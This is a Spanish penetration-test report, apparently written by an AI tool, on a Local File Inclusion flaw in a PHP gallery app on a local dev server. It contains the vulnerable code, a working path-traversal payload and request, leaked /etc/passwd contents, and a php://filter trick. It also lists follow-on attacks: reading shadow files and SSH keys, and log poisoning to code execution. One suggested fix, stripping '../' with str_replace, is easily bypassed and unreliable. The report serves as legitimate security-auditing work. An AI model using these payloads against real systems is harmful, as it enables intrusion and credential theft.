# Informe de Auditoría de Seguridad - Local File Inclusion (LFI)

**Fecha:** 2026-04-30 16:07:59  
**Objetivo:** http://web.dev.local:8081  
**Tipo de análisis:** Local File Inclusion (LFI)  
**Analista:** GitHub Copilot CLI (claude-sonnet-4.6)

---

## Resumen Ejecutivo

Se identificó y explotó exitosamente una vulnerabilidad crítica de **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual". La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de ficheros del servidor, incluyendo ficheros sensibles del sistema operativo.

**Severidad:** 🔴 CRÍTICA (CVSS estimado: 9.1)

---

## Descripción de la Aplicación

- **URL:** http://web.dev.local:8081
- **Tecnología:** PHP / Apache
- **Aplicación:** Galería de Arte Virtual
- **Parámetro vulnerable:** `page` en `gallery.php`

---

## Vulnerabilidad Encontrada

### Local File Inclusion en `gallery.php`

**URL vulnerable:**
```
http://web.dev.local:8081/gallery.php?page=<payload>
```

**Parámetro vulnerable:** `page`

**Tipo:** Path Traversal / Local File Inclusion

### Código fuente vulnerable (obtenido mediante php://filter)

```php
<?php

$page = $_GET['page'] ?? 'modern';

// Check if the page parameter contains file extension
if (strpos($page, '.') !== false) {
    // If it has an extension, use it as-is 
    $file = $page;
} else {
    // Otherwise, assume it's a page in the pages directory
    $file = "pages/" . $page . ".php";
}

if (file_exists($file)) {
    include($file);
} else {
    echo "<div class='error'>";
    echo "<h3>Página no encontrada</h3>";
    echo "<p>El archivo solicitado no existe: " . htmlspecialchars($file) . "</p>";
    echo "</div>";
    // Try to include anyway
    @include($file);
}
?>
```

### Causa raíz

La lógica de la aplicación comprueba si el parámetro `page` contiene un punto (`.`). Si lo contiene, usa el valor directamente como ruta del fichero sin ninguna sanitización ni validación. Dado que las secuencias de directorio `../` contienen puntos, un atacante puede usar path traversal para acceder a cualquier fichero del sistema.

La función `include()` se invoca **sin restricción alguna** (`open_basedir` no configurado, sin whitelist de rutas permitidas).

---

## Explotación

### Payload utilizado

```
../../../etc/passwd
```

### Requests de explotación

```
GET /gallery.php?page=../../../etc/passwd HTTP/1.1
Host: web.dev.local:8081
```

### Archivos leídos exitosamente

#### `/etc/passwd`
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

#### `/proc/version`
```
Linux version 6.8.0-110-generic (buildd@lcy02-amd64-115) 
(x86_64-linux-gnu-gcc-13 (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0, 
GNU ld (GNU Binutils for Ubuntu) 2.42) #110-Ubuntu SMP PREEMPT_DYNAMIC 
Thu Mar 19 15:09:20 UTC 2026
```

#### Código fuente de `gallery.php` (via `php://filter/convert.base64-encode/resource=gallery.php`)

El wrapper `php://filter` también funciona, permitiendo leer el código fuente PHP sin ejecutarlo.

#### `/etc/apache2/sites-enabled/000-default.conf`

Configuración completa del servidor Apache obtenida exitosamente.

---

## Vectores de ataque adicionales posibles

Con esta vulnerabilidad confirmada, un atacante podría:

1. **Leer credenciales:** `/etc/shadow`, archivos de configuración con contraseñas
2. **Leer claves SSH:** `/root/.ssh/id_rsa`, `/home/usuario/.ssh/id_rsa`
3. **Log Poisoning → RCE:** Envenenar logs de Apache (`/var/log/apache2/access.log`) con código PHP malicioso en el User-Agent y luego incluirlos vía LFI para lograr ejecución remota de código (RCE)
4. **Leer código fuente:** Todos los ficheros PHP de la aplicación
5. **Escalada de información:** Lectura de ficheros de configuración de bases de datos

---

## Recomendaciones de Remediación

### 1. Implementar whitelist de páginas permitidas (INMEDIATO)
```php
$allowed_pages = ['modern', 'classic', 'abstract', 'about'];
$page = $_GET['page'] ?? 'modern';

if (!in_array($page, $allowed_pages, true)) {
    $page = 'modern';
}

$file = "pages/" . $page . ".php";
include($file);
```

### 2. Configurar `open_basedir` en PHP
```ini
; En php.ini o .htaccess
open_basedir = /var/www/html/pages/
```

### 3. Eliminar path traversal
Nunca usar entrada del usuario directamente en funciones de ficheros (`include`, `require`, `file_get_contents`, etc.).

### 4. Deshabilitar wrappers PHP peligrosos
```ini
allow_url_include = Off
```

### 5. Validación adicional
```php
// Eliminar secuencias de path traversal
$page = str_replace(['../', '..\\', '/'], '', $page);
```

---

## Clasificación

| Parámetro | Detalle |
|-----------|---------|
| **Vulnerabilidad** | Local File Inclusion (LFI) |
| **CVE relacionado** | CWE-22 (Path Traversal), CWE-98 (PHP File Inclusion) |
| **CVSS v3** | ~9.1 (Critical) |
| **Vector** | GET parameter `page` en `gallery.php` |
| **Autenticación requerida** | No |
| **Explotación** | Confirmada ✅ |
| **Impacto** | Lectura de ficheros arbitrarios del sistema |

---

## Conclusión

La vulnerabilidad LFI encontrada en `gallery.php` es de **severidad crítica**. La lógica defectuosa que diferencia entre páginas con y sin extensión permite a un atacante no autenticado leer cualquier fichero del sistema al que el proceso web tenga acceso. Se recomienda aplicar las correcciones indicadas de forma inmediata, especialmente la implementación de una whitelist de páginas permitidas.
